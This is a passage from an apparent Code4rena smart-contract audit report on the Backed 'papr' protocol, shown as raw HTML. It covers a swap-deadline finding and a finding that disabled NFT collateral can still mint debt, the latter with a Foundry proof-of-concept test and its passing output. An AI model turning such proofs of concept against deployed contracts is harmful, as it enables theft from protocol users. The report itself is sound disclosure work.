id=\"proof-of-concept-4\" style=\"position:relative;\"><a href=\"#proof-of-concept-4\" aria-label=\"proof of concept 4 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>Omitted in this case, since the exploit is solely based on the fact that there is no limit on how long a transaction including a swap is allowed to be pending, which can be clearly seen when looking at the mentioned functions.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-12-backed-findings/issues/64#issuecomment-1369843140\">Jeiwan (warden) commented</a>:</strong></p>\n<blockquote>\n<p>A slippage check is in place, so users are protected from losing funds during swapping:\n<a href=\"https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/libraries/UniswapHelpers.sol#L58-L60\">https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/libraries/UniswapHelpers.sol#L58-L60</a></p>\n<p>The only viable attack scenario seems to be stealing of positive slippage by MEV bots. However, a deadline may not protect from this as well, since a spike in price may happen before a deadline. A too short deadline may also cause undesired reverts during gas price volatility. All in all it seems like users will likely cancel or re-submit their transactions instead of waiting for pending ones.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-12-backed-findings/issues/64#issuecomment-1370078615\">wilsoncusack (Backed) disagreed with severity and commented</a>:</strong></p>\n<blockquote>\n<p>Was going to say what @Jeiwan said. Think it should be Medium or Low.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-12-backed-findings/issues/64#issuecomment-1370861874\">trust1995 (judge) decreased severity to Medium and commented</a>:</strong></p>\n<blockquote>\n<p>On the fence between Low and Medium. I tend to view “stealing of positive slippage” as meaningful enough to warrant Medium severity.</p>\n</blockquote>\n<hr>\n<h2 id=\"m-02-disabled-nft-collateral-should-not-be-used-to-mint-debt\" style=\"position:relative;\"><a href=\"#m-02-disabled-nft-collateral-should-not-be-used-to-mint-debt\" aria-label=\"m 02 disabled nft collateral should not be used to mint debt permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-12-backed-findings/issues/91\">[M-02] Disabled NFT collateral should not be used to mint debt</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2022-12-backed-findings/issues/91\">ladboy233</a>, also found by <a href=\"https://github.com/code-423n4/2022-12-backed-findings/issues/233\">unforgiven</a>, <a href=\"https://github.com/code-423n4/2022-12-backed-findings/issues/223\">bin2chen</a>, <a href=\"https://github.com/code-423n4/2022-12-backed-findings/issues/175\">8olidity</a>, and <a href=\"https://github.com/code-423n4/2022-12-backed-findings/issues/165\">__141345__</a></em></p>\n<p><a href=\"https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L365\">https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L365</a></p>\n<p><a href=\"https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L138\">https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L138</a></p>\n<h3 id=\"impact-2\" style=\"position:relative;\"><a href=\"#impact-2\" aria-label=\"impact 2 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Impact</h3>\n<p>Disabled collateral can still be used to mint debt.</p>\n<h3 id=\"proof-of-concept-5\" style=\"position:relative;\"><a href=\"#proof-of-concept-5\" aria-label=\"proof of concept 5 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>There is an access control function in PaprController.sol:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"22\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @inheritdoc IPaprController</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">setAllowedCollateral</span><span class=\"mtk1\">(IPaprController.CollateralAllowedConfig[] </span><span class=\"mtk12\">calldata</span><span class=\"mtk1\"> </span><span class=\"mtk12\">collateralConfigs</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk11\">external</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk11\">override</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk11\">onlyOwner</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">{</span></span></span></code></pre>\n<p>According to IPaprController, if the collateral is disabled, set to false, the user should not be allowed to mint debt using the collateral:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"23\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @notice sets whether a collateral is allowed to be used to mint debt</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @dev owner function</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @param collateralConfigs configuration settings indicating whether a collateral is allowed or not</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">setAllowedCollateral</span><span class=\"mtk1\">(IPaprController.CollateralAllowedConfig[] </span><span class=\"mtk12\">calldata</span><span class=\"mtk1\"> </span><span class=\"mtk12\">collateralConfigs</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<p>However, the code only checks if the collateral is allowed when adding collateral:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"24\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_addCollateralToVault</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">account</span><span class=\"mtk1\">, IPaprController.Collateral </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">collateral</span><span class=\"mtk1\">) </span><span class=\"mtk11\">internal</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (!</span><span class=\"mtk12\">isAllowed</span><span class=\"mtk1\">[</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">collateral</span><span class=\"mtk1\">.</span><span class=\"mtk12\">addr</span><span class=\"mtk1\">)]) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t</span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk12\">IPaprController</span><span class=\"mtk1\">.</span><span class=\"mtk11\">InvalidCollateral</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t}</span></span></span></code></pre>\n<p>But does not have the same check when minting debt, then user can use disabled collateral to mint debt:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"25\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_increaseDebt</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">account</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk12\">ERC721</span><span class=\"mtk1\"> </span><span class=\"mtk12\">asset</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">mintTo</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\tReservoirOracleUnderwriter.OracleInfo </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">oracleInfo</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">) </span><span class=\"mtk11\">internal</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">cachedTarget</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">updateTarget</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">newDebt</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">_vaultInfo</span><span class=\"mtk1\">[</span><span class=\"mtk12\">account</span><span class=\"mtk1\">][</span><span class=\"mtk12\">asset</span><span class=\"mtk1\">].</span><span class=\"mtk12\">debt</span><span class=\"mtk1\"> + </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">oraclePrice</span><span class=\"mtk1\"> =</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t</span><span class=\"mtk11\">underwritePriceForCollateral</span><span class=\"mtk1\">(</span><span class=\"mtk12\">asset</span><span class=\"mtk1\">, </span><span class=\"mtk12\">ReservoirOracleUnderwriter</span><span class=\"mtk1\">.</span><span class=\"mtk12\">PriceKind</span><span class=\"mtk1\">.</span><span class=\"mtk12\">LOWER</span><span class=\"mtk1\">, </span><span class=\"mtk12\">oracleInfo</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">max</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">_maxDebt</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_vaultInfo</span><span class=\"mtk1\">[</span><span class=\"mtk12\">account</span><span class=\"mtk1\">][</span><span class=\"mtk12\">asset</span><span class=\"mtk1\">].</span><span class=\"mtk12\">count</span><span class=\"mtk1\"> * </span><span class=\"mtk12\">oraclePrice</span><span class=\"mtk1\">, </span><span class=\"mtk12\">cachedTarget</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">newDebt</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk12\">max</span><span class=\"mtk1\">) </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk12\">IPaprController</span><span class=\"mtk1\">.</span><span class=\"mtk11\">ExceedsMaxDebt</span><span class=\"mtk1\">(</span><span class=\"mtk12\">newDebt</span><span class=\"mtk1\">, </span><span class=\"mtk12\">max</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">newDebt</span><span class=\"mtk1\"> &gt;= </span><span class=\"mtk7\">1</span><span class=\"mtk1\"> &lt;&lt; </span><span class=\"mtk7\">200</span><span class=\"mtk1\">) </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk12\">IPaprController</span><span class=\"mtk1\">.</span><span class=\"mtk11\">DebtAmountExceedsUint200</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk12\">_vaultInfo</span><span class=\"mtk1\">[</span><span class=\"mtk12\">account</span><span class=\"mtk1\">][</span><span class=\"mtk12\">asset</span><span class=\"mtk1\">].</span><span class=\"mtk12\">debt</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">uint200</span><span class=\"mtk1\">(</span><span class=\"mtk12\">newDebt</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk11\">PaprToken</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">papr</span><span class=\"mtk1\">)).</span><span class=\"mtk11\">mint</span><span class=\"mtk1\">(</span><span class=\"mtk12\">mintTo</span><span class=\"mtk1\">, </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk12\">emit</span><span class=\"mtk1\"> </span><span class=\"mtk11\">IncreaseDebt</span><span class=\"mtk1\">(</span><span class=\"mtk12\">account</span><span class=\"mtk1\">, </span><span class=\"mtk12\">asset</span><span class=\"mtk1\">, </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<p>As shown in the coded POC, we can add the following test to increaseDebt.t.sol:</p>\n<p><a href=\"https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/test/paprController/IncreaseDebt.t.sol#L32\">https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/test/paprController/IncreaseDebt.t.sol#L32</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"26\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">testIncreaseDebt_POC</span><span class=\"mtk1\">() </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">debt</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">10</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk3\">// console.log(debt);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">assume</span><span class=\"mtk1\">(</span><span class=\"mtk12\">debt</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk11\">type</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint200</span><span class=\"mtk1\">).</span><span class=\"mtk12\">max</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">assume</span><span class=\"mtk1\">(</span><span class=\"mtk12\">debt</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk11\">type</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">).</span><span class=\"mtk12\">max</span><span class=\"mtk1\"> / </span><span class=\"mtk12\">controller</span><span class=\"mtk1\">.</span><span class=\"mtk11\">maxLTV</span><span class=\"mtk1\">() / </span><span class=\"mtk7\">2</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk12\">oraclePrice</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">debt</span><span class=\"mtk1\"> * </span><span class=\"mtk7\">2</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk12\">oracleInfo</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">_getOracleInfoForCollateral</span><span class=\"mtk1\">(</span><span class=\"mtk12\">nft</span><span class=\"mtk1\">, </span><span class=\"mtk12\">underlying</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">startPrank</span><span class=\"mtk1\">(</span><span class=\"mtk12\">borrower</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk12\">nft</span><span class=\"mtk1\">.</span><span class=\"mtk11\">approve</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">controller</span><span class=\"mtk1\">), </span><span class=\"mtk12\">collateralId</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk12\">IPaprController</span><span class=\"mtk1\">.</span><span class=\"mtk12\">Collateral</span><span class=\"mtk1\">[] </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">c</span><span class=\"mtk1\"> = </span><span class=\"mtk4\">new</span><span class=\"mtk1\"> </span><span class=\"mtk10\">IPaprController</span><span class=\"mtk1\">.</span><span class=\"mtk10\">Collateral</span><span class=\"mtk1\">[](</span><span class=\"mtk7\">1</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk12\">c</span><span class=\"mtk1\">[</span><span class=\"mtk7\">0</span><span class=\"mtk1\">] = </span><span class=\"mtk12\">collateral</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk12\">controller</span><span class=\"mtk1\">.</span><span class=\"mtk11\">addCollateral</span><span class=\"mtk1\">(</span><span class=\"mtk12\">c</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk3\">// disable the collateral but still able to mint debt</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk12\">IPaprController</span><span class=\"mtk1\">.</span><span class=\"mtk12\">CollateralAllowedConfig</span><span class=\"mtk1\">[] </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">args</span><span class=\"mtk1\"> = </span><span class=\"mtk4\">new</span><span class=\"mtk1\"> </span><span class=\"mtk10\">IPaprController</span><span class=\"mtk1\">.</span><span class=\"mtk10\">CollateralAllowedConfig</span><span class=\"mtk1\">[](</span><span class=\"mtk7\">1</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk12\">args</span><span class=\"mtk1\">[</span><span class=\"mtk7\">0</span><span class=\"mtk1\">] = </span><span class=\"mtk12\">IPaprController</span><span class=\"mtk1\">.</span><span class=\"mtk11\">CollateralAllowedConfig</span><span class=\"mtk1\">({</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t</span><span class=\"mtk12\">collateral:</span><span class=\"mtk1\"> </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">collateral</span><span class=\"mtk1\">.</span><span class=\"mtk12\">addr</span><span class=\"mtk1\">),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t</span><span class=\"mtk12\">allowed:</span><span class=\"mtk1\"> </span><span class=\"mtk4\">false</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t});</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">stopPrank</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">prank</span><span class=\"mtk1\">(</span><span class=\"mtk12\">controller</span><span class=\"mtk1\">.</span><span class=\"mtk11\">owner</span><span class=\"mtk1\">());</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk12\">controller</span><span class=\"mtk1\">.</span><span class=\"mtk11\">setAllowedCollateral</span><span class=\"mtk1\">(</span><span class=\"mtk12\">args</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">startPrank</span><span class=\"mtk1\">(</span><span class=\"mtk12\">borrower</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk12\">controller</span><span class=\"mtk1\">.</span><span class=\"mtk11\">increaseDebt</span><span class=\"mtk1\">(</span><span class=\"mtk12\">borrower</span><span class=\"mtk1\">, </span><span class=\"mtk12\">collateral</span><span class=\"mtk1\">.</span><span class=\"mtk12\">addr</span><span class=\"mtk1\">, </span><span class=\"mtk12\">debt</span><span class=\"mtk1\">, </span><span class=\"mtk12\">oracleInfo</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk12\">debtToken</span><span class=\"mtk1\">.</span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk12\">borrower</span><span class=\"mtk1\">), </span><span class=\"mtk12\">debt</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk12\">debt</span><span class=\"mtk1\">, </span><span class=\"mtk12\">controller</span><span class=\"mtk1\">.</span><span class=\"mtk11\">vaultInfo</span><span class=\"mtk1\">(</span><span class=\"mtk12\">borrower</span><span class=\"mtk1\">, </span><span class=\"mtk12\">collateral</span><span class=\"mtk1\">.</span><span class=\"mtk12\">addr</span><span class=\"mtk1\">).</span><span class=\"mtk12\">debt</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<p>We disable the collateral but still are able to mint debt by calling increaseDebt.</p>\n<p>We run the test:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"27\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">forge</span><span class=\"mtk1\"> </span><span class=\"mtk12\">test</span><span class=\"mtk1\"> -</span><span class=\"mtk12\">vvv</span><span class=\"mtk1\"> --</span><span class=\"mtk12\">match</span><span class=\"mtk1\"> </span><span class=\"mtk12\">testIncreaseDebt_POC</span></span></span></code></pre>\n<p>The test passes, but the test should revert.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"28\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">Running 1 test for test/paprController/IncreaseDebt.t.sol:IncreaseDebtTest</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">[PASS] testIncreaseDebt_POC() (gas: 239301)</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">Test result: ok. 1 passed; 0 failed; finished in 237.42ms</span></span></code></pre>\n<h3 id=\"recommended-mitigation-steps-5\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-5\" aria-label=\"recommended mitigation steps 5 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 